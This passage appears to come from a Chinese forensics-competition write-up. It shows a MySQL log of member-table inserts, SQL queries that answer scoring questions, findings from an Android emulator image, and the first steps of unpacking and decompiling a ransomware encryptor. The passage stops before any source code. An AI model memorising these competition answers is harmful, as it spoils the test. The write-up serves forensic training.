NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13530690975&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo975&#x27;, 1, NULL, 0, &#x27;2022-10-18 15:23:44&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1975&#x27;, &#x27;2022-10-18 15:23:44&#x27;, 1, NULL, 0, &#x27;13530690975&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 3, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:07.979831Z	   12 Query	INSERT INTO `member` VALUES (976, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13942370976&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo976&#x27;, 1, NULL, 0, &#x27;2022-10-18 16:33:24&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1976&#x27;, &#x27;2022-10-18 16:33:24&#x27;, 1, NULL, 0, &#x27;13942370976&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 1, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:07.985614Z	   12 Query	INSERT INTO `member` VALUES (977, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13486370977&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo977&#x27;, 1, NULL, 0, &#x27;2022-10-18 13:4:43&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1977&#x27;, &#x27;2022-10-18 13:4:43&#x27;, 1, NULL, 0, &#x27;13486370977&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 5, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:07.991726Z	   12 Query	INSERT INTO `member` VALUES (978, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13840370978&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo978&#x27;, 1, NULL, 0, &#x27;2022-10-18 14:14:23&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1978&#x27;, &#x27;2022-10-18 14:14:23&#x27;, 1, NULL, 0, &#x27;13840370978&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 3, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:07.996485Z	   12 Query	INSERT INTO `member` VALUES (979, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13384370979&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo979&#x27;, 1, NULL, 0, &#x27;2022-10-18 15:24:3&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1979&#x27;, &#x27;2022-10-18 15:24:3&#x27;, 1, NULL, 0, &#x27;13384370979&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 1, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.002778Z	   12 Query	INSERT INTO `member` VALUES (980, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13738370980&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo980&#x27;, 1, NULL, 0, &#x27;2022-10-18 16:33:43&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1980&#x27;, &#x27;2022-10-18 16:33:43&#x27;, 1, NULL, 0, &#x27;13738370980&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 5, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.008331Z	   12 Query	INSERT INTO `member` VALUES (981, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13282380981&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo981&#x27;, 1, NULL, 0, &#x27;2022-10-18 13:15:36&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1981&#x27;, &#x27;2022-10-18 13:15:36&#x27;, 1, NULL, 0, &#x27;13282380981&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 3, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.013494Z	   12 Query	INSERT INTO `member` VALUES (982, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13736380982&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo982&#x27;, 1, NULL, 0, &#x27;2022-10-18 14:25:16&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1982&#x27;, &#x27;2022-10-18 14:25:16&#x27;, 1, NULL, 0, &#x27;13736380982&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 5, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.019163Z	   12 Query	INSERT INTO `member` VALUES (983, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13248060983&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo983&#x27;, 1, NULL, 0, &#x27;2022-10-18 15:34:56&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1983&#x27;, &#x27;2022-10-18 15:34:56&#x27;, 1, NULL, 0, &#x27;13248060983&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 3, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.023970Z	   12 Query	INSERT INTO `member` VALUES (984, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13692060984&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo984&#x27;, 1, NULL, 0, &#x27;2022-10-18 16:44:36&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1984&#x27;, &#x27;2022-10-18 16:44:36&#x27;, 1, NULL, 0, &#x27;13692060984&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 1, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.030725Z	   12 Query	INSERT INTO `member` VALUES (985, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13146060985&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo985&#x27;, 1, NULL, 0, &#x27;2022-10-18 13:15:55&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1985&#x27;, &#x27;2022-10-18 13:15:55&#x27;, 1, NULL, 0, &#x27;13146060985&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 5, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.035551Z	   12 Query	INSERT INTO `member` VALUES (986, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13590070986&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo986&#x27;, 1, NULL, 0, &#x27;2022-10-18 14:25:34&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1986&#x27;, &#x27;2022-10-18 14:25:34&#x27;, 1, NULL, 0, &#x27;13590070986&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 3, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.040445Z	   12 Query	INSERT INTO `member` VALUES (987, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13844070987&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo987&#x27;, 1, NULL, 0, &#x27;2022-10-18 15:35:14&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1987&#x27;, &#x27;2022-10-18 15:35:14&#x27;, 1, NULL, 0, &#x27;13844070987&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 6, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.048228Z	   12 Query	INSERT INTO `member` VALUES (988, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13388070988&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo988&#x27;, 1, NULL, 0, &#x27;2022-10-18 16:44:54&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1988&#x27;, &#x27;2022-10-18 16:44:54&#x27;, 1, NULL, 0, &#x27;13388070988&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 4, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.053610Z	   12 Query	INSERT INTO `member` VALUES (989, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13742070989&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo989&#x27;, 1, NULL, 0, &#x27;2022-10-18 13:26:47&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1989&#x27;, &#x27;2022-10-18 13:26:47&#x27;, 1, NULL, 0, &#x27;13742070989&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 2, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.058670Z	   12 Query	INSERT INTO `member` VALUES (990, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13353750990&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo990&#x27;, 1, NULL, 0, &#x27;2022-10-18 14:36:27&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1990&#x27;, &#x27;2022-10-18 14:36:27&#x27;, 1, NULL, 0, &#x27;13353750990&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 4, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.066046Z	   12 Query	INSERT INTO `member` VALUES (991, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13797750991&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo991&#x27;, 1, NULL, 0, &#x27;2022-10-18 15:46:7&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1991&#x27;, &#x27;2022-10-18 15:46:7&#x27;, 1, NULL, 0, &#x27;13797750991&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 2, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.070986Z	   12 Query	INSERT INTO `member` VALUES (992, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13251760992&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo992&#x27;, 1, NULL, 0, &#x27;2022-10-18 16:55:47&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1992&#x27;, &#x27;2022-10-18 16:55:47&#x27;, 1, NULL, 0, &#x27;13251760992&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 6, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.076234Z	   12 Query	INSERT INTO `member` VALUES (993, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13695760993&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo993&#x27;, 1, NULL, 0, &#x27;2022-10-18 13:27:6&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1993&#x27;, &#x27;2022-10-18 13:27:6&#x27;, 1, NULL, 0, &#x27;13695760993&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 4, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.081554Z	   12 Query	INSERT INTO `member` VALUES (994, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13149760994&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo994&#x27;, 1, NULL, 0, &#x27;2022-10-18 14:36:46&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1994&#x27;, &#x27;2022-10-18 14:36:46&#x27;, 1, NULL, 0, &#x27;13149760994&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 2, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.086191Z	   12 Query	INSERT INTO `member` VALUES (995, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13593760995&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo995&#x27;, 1, NULL, 0, &#x27;2022-10-18 15:46:26&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1995&#x27;, &#x27;2022-10-18 15:46:26&#x27;, 1, NULL, 0, &#x27;13593760995&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 6, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.091434Z	   12 Query	INSERT INTO `member` VALUES (996, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13947760996&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo996&#x27;, 1, NULL, 0, &#x27;2022-10-18 16:56:6&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1996&#x27;, &#x27;2022-10-18 16:56:6&#x27;, 1, NULL, 0, &#x27;13947760996&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 4, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.097094Z	   12 Query	INSERT INTO `member` VALUES (997, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13459440997&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo997&#x27;, 1, NULL, 0, &#x27;2022-10-18 13:37:59&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1997&#x27;, &#x27;2022-10-18 13:37:59&#x27;, 1, NULL, 0, &#x27;13459440997&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 6, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.101734Z	   12 Query	INSERT INTO `member` VALUES (998, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13913450998&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo998&#x27;, 1, NULL, 0, &#x27;2022-10-18 14:47:39&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1998&#x27;, &#x27;2022-10-18 14:47:39&#x27;, 1, NULL, 0, &#x27;13913450998&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 4, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.108159Z	   12 Query	INSERT INTO `member` VALUES (999, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13457450999&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo999&#x27;, 1, NULL, 0, &#x27;2022-10-18 15:57:19&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1999&#x27;, &#x27;2022-10-18 15:57:19&#x27;, 1, NULL, 0, &#x27;13457450999&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 2, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:08.113211Z	   12 Query	INSERT INTO `member` VALUES (1000, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13811451000&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo1000&#x27;, 1, NULL, 0, &#x27;2022-10-18 17:6:59&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c11000&#x27;, &#x27;2022-10-18 17:6:59&#x27;, 1, NULL, 0, &#x27;13811451000&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 6, 0, 0, NULL)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711012124398.png" alt="image-20240711012124398"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711012149629.png" alt="image-20240711012149629"></p>
+<p>158+6&#x3D;164</p>
+<ol start="30">
+<li>还原全部被删改数据，哪些用户ID没有充值记录(答案填写阿拉伯数字，多个ID以逗号分隔，如“15,16,17”)10分<br>(答案填写阿拉伯数字，多个ID以逗号分隔，如“15,16,17”)</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711012539074.png" alt="image-20240711012539074"></p>
+<ol start="31">
+<li>还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？(答案填写阿拉伯数字，如“15”)10分<br>(答案填写阿拉伯数字，如“15”)</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM `member_transaction` WHERE create_time BETWEEN &quot;2022-10-17  00:00:00&quot; AND &quot;2022-10-17 23:59:59&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711012614242.png" alt="image-20240711012614242"></p>
+<ol start="32">
+<li>还原全部被删改数据，该网站中充值的USDT总额为(答案填写阿拉伯数字，如“15”)10分<br>(答案填写阿拉伯数字，如“15”)</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(amount) FROM member_transaction</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711012644790.png" alt="image-20240711012644790"></p>
+<h1 id="检材4"><a href="#检材4" class="headerlink" title="检材4"></a>检材4</h1><p>根据前期侦查分析，警方通过技术手段找到了网站幕后老板，并对其使用的安卓模拟器“检材4”进行固定和分析，分析所有掌握的检材请根据检材4回答下列问题</p>
+<ol start="33">
+<li>嫌疑人使用的安卓模拟器软件名称是</li>
+</ol>
+<p>夜神模拟器的备份文件，直接解压即可，丢到火眼跑</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711120905534.png" alt="image-20240711120905534"></p>
+<ol start="34">
+<li>检材4中，“老板”的阿里云账号是</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711134404192.png" alt="image-20240711134404192"></p>
+<ol start="35">
+<li>检材4中安装的VPN工具的软件名称是</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711134412228.png" alt="image-20240711134412228"></p>
+<ol start="36">
+<li>上述VPN工具中记录的节点IP是</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711134422006.png" alt="image-20240711134422006"></p>
+<ol start="37">
+<li>检材4中，录屏软件安装时间为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711134811257.png" alt="image-20240711134811257"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711134839346.png" alt="image-20240711134839346"></p>
+<ol start="38">
+<li>上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711135109192.png" alt="image-20240711135109192"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711135209953.png" alt="image-20240711135209953"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711135241474.png" alt="image-20240711135241474"></p>
+<ol start="39">
+<li>上述录屏软件登录的手机号是</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711135308429.png" alt="image-20240711135308429"></p>
+<ol start="40">
+<li>检材4中，发送勒索邮件的邮箱地址为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711135345929.png" alt="image-20240711135345929"></p>
+<h1 id="exe分析"><a href="#exe分析" class="headerlink" title="exe分析"></a>exe分析</h1><p>分析所有掌握的检材，找到勒索邮件中被加密的文档和对应的加解密程序，并回答下列问题</p>
+<ol start="41">
+<li>分析加密程序，编译该加密程序使用的语言是</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711140004926.png" alt="image-20240711140004926"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711140115240.png" alt="image-20240711140115240"></p>
+<p>导出后查看图标接口</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711140456096.png" alt="image-20240711140456096"></p>
+<p>PyInstaller打包的文件</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711140617160.png" alt="image-20240711140617160"></p>
+<ol start="42">
+<li>分析加密程序，它会加密哪些扩展名的文件？<br>.txt .jpg .xls .docx</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/loovelj/article/details/107364022">Pyinstaller解包_puinstaller解包-CSDN博客</a></p>
+<p>pyinstxtractor解包，再uncompyle6反编译</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711141156960.png" alt="image-20240711141156960"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711141440208.png" alt="image-20240711141440208"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 encrypt_file_1.pyc &gt;eeennncrypt.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711141953906.png" alt="image-20240711141953906"></p>
+<p>得到源码</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711142026522.png" alt="image-20240711142026522"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 